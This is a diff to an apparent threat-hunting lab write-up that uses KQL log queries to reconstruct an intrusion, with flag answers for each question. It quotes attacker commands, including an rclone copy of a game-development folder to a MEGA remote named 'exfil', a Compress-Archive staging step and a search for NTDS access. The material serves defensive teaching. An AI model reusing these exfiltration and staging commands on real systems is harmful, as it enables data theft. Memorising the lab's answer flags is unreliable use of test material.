@@ -242,8 +242,8 @@ This email serves as the attacker's persistent identifier across the exfiltratio
 EmberForgeX_CL
 | where TimeGenerated >= datetime(2026-02-10)
 | where TimeGenerated <= datetime(2026-02-11)
-| where Computer has "EEU3IA2"
-| where CommandLine_s has "ntds"
+| where Computer has_any ("EEU3IA2")
+| where CommandLine_s has_any ("ntds")
 | project TimeGenerated, CommandLine_s
 ```
 
@@ -321,5 +321,24 @@ rclone.exe --config C:\Users\Public\rclone.conf copy C:\GameDev mega:exfil --meg
 **Flag:** `Summer2024!`
 
 > **Lesson:** Attackers frequently pass credentials directly as command line arguments, trading operational security for convenience. These show up verbatim in Sysmon Event ID 1 (Process Creation) logs. A single rclone command exposed the cloud storage service, destination path, email, and password simultaneously. When you find an exfil tool in the logs, always read the full argument list — credentials, config paths, and remote destinations are often right there.
+
+</details>
+
+<details>
+<summary>Q08 — Archive Method</summary>
+
+**Goal:** Identify the tool or command used to compress the stolen data.
+
+**Approach:** No additional query needed. The compression command was captured in Q01. The full command line from that query showed PowerShell's built-in `Compress-Archive` cmdlet being used to package the GameDev directory:
+
+```
+powershell.exe -c "Compress-Archive -Path C:\GameDev -DestinationPath C:\Users\Public\gamedev.zip"
+```
+
+The cmdlet name is the archive method the lab is asking for.
+
+**Flag:** `Compress-Archive`
+
+> **Lesson:** A single well-scoped query early in the hunt can answer multiple downstream questions. The Q01 query that found the target directory also captured the full command, exposing the archive tool, source path, and destination path in one shot. When you project the full CommandLine_s field rather than just filtering on it, you get everything the attacker typed — not just confirmation that they typed something.
 
 </details>
